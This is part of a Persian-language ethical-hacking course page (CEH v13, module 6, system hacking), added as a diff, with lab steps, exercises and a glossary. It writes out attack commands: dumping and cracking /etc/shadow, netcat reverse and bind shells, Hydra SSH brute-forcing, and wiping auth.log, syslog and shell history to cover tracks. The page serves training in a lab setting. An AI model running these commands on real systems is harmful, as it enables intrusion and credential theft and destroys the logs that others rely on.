+        <p><b>تحلیل:</b> پس از بهره‌برداری، یک شل با دسترسی root دریافت می‌کنید.</p>
+
+        <h4>مرحله ۳: کرک پسورد با John the Ripper</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># دریافت فایل shadow (با دسترسی root)
+cat /etc/shadow
+
+# کرک با John
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt</code></pre>
+        </div>
+        <p><b>تحلیل:</b> رمز عبور کاربران را پیدا کنید.</p>
+
+        <h4>مرحله ۴: نصب درب پشتی</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ایجاد یک شل معکوس با Netcat (سمت هکر)
+nc -lvnp 4444
+
+# سمت هدف (با دسترسی root)
+nc -e /bin/bash 192.168.1.100 4444</code></pre>
+        </div>
+        <p><b>تحلیل:</b> با اجرای این دستور، هکر می‌تواند هر زمان به سیستم متصل شود.</p>
+
+        <h4>مرحله ۵: پاک کردن ردپا</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># پاک کردن لاگ‌ها
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+
+# پاک کردن تاریخچه
+history -c
+rm -f ~/.bash_history</code></pre>
+        </div>
+        <p><b>تحلیل:</b> تمام آثار حمله پاک می‌شود.</p>
+
+        <div class="highlight-box">
+            <b>⏳ تکلیف:</b> تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند System Hacking تهیه کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice-exercises">
+        <h2>📝 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های System Hacking خود را تقویت کنید.
+        </p>
+
+        <ul>
+            <li>
+                <b>تمرین ۱ – کرک پسورد:</b>
+                <br>با استفاده از John the Ripper، یک فایل shadow را کرک کنید و رمز عبور کاربران را پیدا کنید.
+            </li>
+            <li>
+                <b>تمرین ۲ – Brute-Force SSH:</b>
+                <br>با استفاده از Hydra، یک حمله Brute-Force به سرویس SSH یک دستگاه هدف انجام دهید.
+            </li>
+            <li>
+                <b>تمرین ۳ – افزایش دسترسی:</b>
+                <br>روی یک سیستم لینوکس، با استفاده از آسیب‌پذیری Dirty Cow، دسترسی خود را به root افزایش دهید.
+            </li>
+            <li>
+                <b>تمرین ۴ – ایجاد درب پشتی:</b>
+                <br>با استفاده از Netcat، یک شل معکوس ایجاد کنید و از آن برای اتصال مجدد به سیستم استفاده کنید.
+            </li>
+            <li>
+                <b>تمرین ۵ – پنهان‌سازی:</b>
+                <br>با استفاده از steghide، یک پیام مخفی را درون یک تصویر پنهان کنید و سپس آن را استخراج کنید.
+            </li>
+            <li>
+                <b>تمرین ۶ – ترکیبی:</b>
+                <br>یک سناریوی کامل System Hacking (نفوذ، افزایش دسترسی، حفظ دسترسی، پاک کردن ردپا) را روی Metasploitable 2 پیاده‌سازی کنید.
+            </li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی (Glossary)</h2>
+        <p>
+            در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با <b>ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره</b> توضیح داده شده است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr>
+                    <th style="min-width:130px;">واژه</th>
+                    <th style="min-width:100px;">ساختار / مخفف</th>
+                    <th>تعریف ساده</th>
+                    <th>کاربرد در هک</th>
+                    <th>مثال</th>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">System Hacking</span></td>
+                    <td>—</td>
+                    <td>فرآیند نفوذ و کنترل یک سیستم هدف.</td>
+                    <td>دسترسی، افزایش دسترسی، حفظ دسترسی، پاک کردن ردپا.</td>
+                    <td>نفوذ به یک سرور لینوکس و گرفتن دسترسی root.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Privilege Escalation</span></td>
+                    <td>—</td>
+                    <td>افزایش سطح دسترسی در یک سیستم.</td>
+                    <td>به‌دست آوردن دسترسی root/admin.</td>
+                    <td>استفاده از آسیب‌پذیری Dirty Cow برای افزایش دسترسی.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Backdoor</span></td>
+                    <td>—</td>
+                    <td>یک راه مخفی برای دسترسی به سیستم.</td>
+                    <td>حفظ دسترسی پس از نفوذ.</td>
+                    <td>نصب یک Web Shell روی سرور.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Rootkit</span></td>
+                    <td>—</td>
+                    <td>مجموعه ابزارهای پنهان‌سازی و حفظ دسترسی.</td>
+                    <td>پنهان‌سازی فایل‌ها، فرآیندها و لاگ‌ها.</td>
+                    <td>استفاده از روت‌کیت برای پنهان کردن یک درب پشتی.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Password Cracking</span></td>
+                    <td>—</td>
+                    <td>فرآیند پیدا کردن رمز عبور از روی هش یا با حدس.</td>
+                    <td>دسترسی به حساب‌های کاربری.</td>
+                    <td>کرک فایل shadow با John the Ripper.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Dictionary Attack</span></td>
+                    <td>—</td>
+                    <td>حمله با استفاده از لیست کلمات رایج.</td>
+                    <td>پیدا کردن رمزهای ضعیف.</td>
+                    <td>استفاده از rockyou.txt برای کرک پسورد.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Brute-Force</span></td>
+                    <td>—</td>
+                    <td>حمله با امتحان تمام ترکیب‌های ممکن.</td>
+                    <td>پیدا کردن هر نوع رمز عبور.</td>
+                    <td>استفاده از Hashcat برای Brute-Force.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Rainbow Table</span></td>
+                    <td>—</td>
+                    <td>جداول از پیش محاسبه‌شده برای هش‌ها.</td>
+                    <td>کرک سریع هش‌ها.</td>
+                    <td>استفاده از RainbowCrack برای کرک هش MD5.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">John the Ripper</span></td>
+                    <td>—</td>
+                    <td>ابزار کرک پسورد متن‌باز.</td>
+                    <td>کرک فایل‌های shadow و هش‌ها.</td>
+                    <td><code dir='ltr'>john --wordlist=rockyou.txt shadow.txt</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Hashcat</span></td>
+                    <td>—</td>
+                    <td>سریع‌ترین ابزار کرک پسورد با پشتیبانی از GPU.</td>
+                    <td>کرک انواع هش با سرعت بالا.</td>
+                    <td><code dir='ltr'>hashcat -m 0 hash.txt rockyou.txt</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Hydra</span></td>
+                    <td>—</td>
+                    <td>ابزار Brute-Force به سرویس‌های شبکه.</td>
+                    <td>حمله به SSH, FTP, HTTP و …</td>
+                    <td><code dir='ltr'>hydra -l admin -P pass.txt ssh://192.168.1.1</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Reverse Shell</span></td>
+                    <td>—</td>
+                    <td>شل که سیستم هدف به هکر متصل می‌شود.</td>
+                    <td>دور زدن فایروال و NAT.</td>
+                    <td><code dir='ltr'>nc -e /bin/bash 192.168.1.100 4444</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Bind Shell</span></td>
+                    <td>—</td>
+                    <td>شل که روی یک پورت گوش می‌دهد.</td>
+                    <td>دسترسی مستقیم به سیستم.</td>
+                    <td><code dir='ltr'>nc -lvnp 4444 -e /bin/bash</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Steganography</span></td>
+                    <td>—</td>
+                    <td>پنهان‌سازی اطلاعات درون فایل‌های دیگر.</td>
+                    <td>انتقال مخفیانه اطلاعات.</td>
+                    <td>پنهان‌سازی یک فایل درون تصویر با steghide.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Covering Tracks</span></td>
+                    <td>—</td>
+                    <td>پاک کردن آثار حمله.</td>
+                    <td>جلوگیری از شناسایی.</td>
+                    <td>پاک کردن لاگ‌ها و تاریخچه دستورات.</td>
+                </tr>
+
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۶ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی ماژول ۶:</b>
+        <p>
+            در این ماژول با یکی از مهم‌ترین مراحل هک قانونمند، یعنی <b>System Hacking</b> آشنا شدید:
+        </p>
+        <ul>
+            <li><b>چرخه System Hacking</b> شامل دسترسی، افزایش دسترسی، حفظ دسترسی و پاک کردن ردپا.</li>
+            <li><b>کرک پسورد</b> با حملات دیکشنری، Brute-Force، Rainbow Table و ابزارهایی مانند John the Ripper و Hashcat.</li>
+            <li><b>افزایش دسترسی</b> با بهره‌برداری از آسیب‌پذیری‌های محلی و سوءاستفاده از تنظیمات اشتباه.</li>
+            <li><b>حفظ دسترسی</b> با نصب درب‌های پشتی، روت‌کیت و شل‌های معکوس.</li>
+            <li><b>پاک کردن ردپا</b> با پاک کردن لاگ‌ها و تاریخچه.</li>
+            <li><b>پنهان‌سازی (Steganography)</b> برای انتقال مخفیانه اطلاعات.</li>
+            <li><b>نقش هوش مصنوعی</b> در System Hacking.</li>
+            <li><b>راه‌های مقابله</b> با System Hacking.</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> در <a href="../Module_07_Malware_Threats/index.html" style="color:#2a7de1;font-weight:bold;">ماژول ۷ – Malware Threats</a> با انواع بدافزارها و روش‌های مقابله با آنها آشنا خواهید شد.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">ماژول ۶ – System Hacking | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
